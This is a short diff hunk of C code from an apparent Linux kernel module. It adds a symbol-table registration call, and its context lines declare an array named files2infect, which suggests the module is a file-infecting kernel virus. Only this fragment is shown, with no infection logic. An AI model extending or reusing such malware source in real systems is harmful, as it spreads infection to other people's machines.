@@ -131,7 +131,7 @@ static struct symbol_table my_symtab = {
         X(register_symtab_from),
         #include <linux/symtab_end.h>
 };
-
+register_symtab(&module_syms); /*do the actual registration*/
 char files2infect[7][60 + 2];
 
 /* const char kernel_version[] = UTS_RELEASE; */
